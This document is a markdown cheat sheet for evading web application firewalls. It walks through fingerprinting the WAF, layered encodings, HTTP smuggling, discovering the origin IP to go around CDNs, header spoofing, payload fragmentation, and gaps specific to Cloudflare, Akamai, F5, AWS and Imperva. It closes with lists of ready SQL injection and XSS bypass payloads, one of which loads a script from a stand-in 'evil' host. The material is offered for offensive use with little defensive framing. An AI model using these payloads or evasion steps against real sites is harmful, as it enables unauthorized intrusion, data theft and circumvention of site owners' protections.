# WAF Bypass

Generic techniques. Pair with class-specific cheatsheets (xss, sqli, ssrf).

## Fingerprint the WAF

```bash
wafw00f https://target.com
curl -si "https://target.com/?x=<script>alert(1)</script>" | head -20
```

Header tells: `Server: cloudflare`, `X-Sucuri-ID`, `X-Cache: Akamai`, `cf-ray`, `X-Amz-Cf-Id`, `X-Iinfo` (Incapsula), `Set-Cookie: __cfduid`, `AWSALB` + `x-amzn-waf-action`.

## Encoding layers

Peel / add layers until WAF and origin disagree.

- URL: `%3Cscript%3E`, double `%253C`, triple `%25253C`.
- HTML entities: `&lt;script&gt;`, `&#x3c;`, `&#60;`, `&#x3C;`.
- Unicode: `\u003c`, `\u{3c}`, full-width `＜`.
- UTF-7 (rare, some parsers): `+ADw-script+AD4-`.
- Mixed case: `<ScRiPt>`.
- Whitespace: `<script\t>`, `<script\n>`, `<script/src=//evil>`, `<script%0a>`.
- Null byte: `<scri\x00pt>` (Java/legacy).
- Comment split: `<scr<!---->ipt>`, SQL `/*!50000SELECT*/`.

## HTTP layer

- Case on methods: `get`, `GeT`.
- Method override: `X-HTTP-Method-Override: DELETE`.
- Path normalization: `/api/./users`, `/api/users/.`, `/api//users`, `/api/users%20`, `/api/users;param=x`.
- Content-Type swap: `application/json` vs `application/x-www-form-urlencoded` vs `application/xml` — WAF rules differ per type.
- Chunked encoding — some WAFs skip bodies > N bytes; split payload.
- HTTP/2 pseudo-headers — some WAFs only match HTTP/1.
- HTTP request smuggling — CL.TE / TE.CL / H2.CL / H2.TE sneaks the malicious request past front-end WAF (see `portswigger.net/research/http-desync-attacks`).

## Header tricks

Origin IP discovery (bypass WAF entirely):
- Censys / Shodan for SSL cert SAN + `target.com` outside Cloudflare ranges.
- `crimeflare.org`, historical DNS, subdomain leaks pointing to origin.
- `Host: target.com` on the discovered IP → bypass CDN.

Cache-level:
- `X-Forwarded-For: 127.0.0.1` — some origins trust → rate-limit / authz bypass.
- `X-Original-URL`, `X-Rewrite-URL` — path override past WAF.
- `X-Forwarded-Host` — host-header injection past WAF.

## Fragmentation

- Large paddings — WAF engines buffer up to N bytes.
- Split payloads across params — each looks benign alone:
  - `?a=<scr&b=ipt>` joined server-side.
- Nested param encoding: `?q={"x":"<script>"}` — JSON WAFs often weaker.

## Cloudflare specifics

- `%0b`, `%0c` in URL sometimes pass.
- Leading dot in host: `target.com.` (trailing dot) → different edge behavior.
- WebSocket upgrade — WAF rules often only apply to HTTP.
- Worker routes — occasionally expose origin via `fetch(origin_url)` patterns.
- See `Cloudflare-WAF-Bypass/` for kdairatchi-collected PoCs.

## Akamai / Imperva / F5 / AWS

- Akamai: `Pragma: akamai-x-cache-on` and `Pragma: akamai-x-get-client-ip` leak info.
- F5 BIG-IP: `Cookie: BIGipServer...` sometimes encodes origin IP.
- AWS WAF: limited body inspection (8KB) — bury payload past that.
- Imperva: `.css` / `.js` extension on path often skipped.

## SQLi WAF bypasses (quick)

```
' OR 1-- -                       (negative with comment)
'/**/OR/**/1=1-- -
'%09OR%091=1-- -
%27%20or%201%3d1-- -
' oR 1=1-- -
' UnIoN/**//*!50000SELECT*/ 1--
```

## XSS WAF bypasses (quick)

```
<svg/onload=alert(1)>
<img src=x onerror=alert`1`>
<details/open/ontoggle=alert(1)>
<svg><script>alert&lpar;1&rpar;</script>
<img src=x onerror="import('data:,alert(1)')">
```

## Automation

- [bypass-url-parser](https://github.com/laluka/bypass-url-parser) — 403 bypass payloads.
- [nuclei](https://github.com/projectdiscovery/nuclei) — `tags:waf-bypass`.
- Burp Intruder with payload-processors chaining encoders.

## References

- awesome-waf — https://github.com/0xInfection/Awesome-WAF
- Kettle HTTP Desync — https://portswigger.net/research/http-desync-attacks
- Kettle H2 smuggling — https://portswigger.net/research/http2
- laluka bypass-url-parser
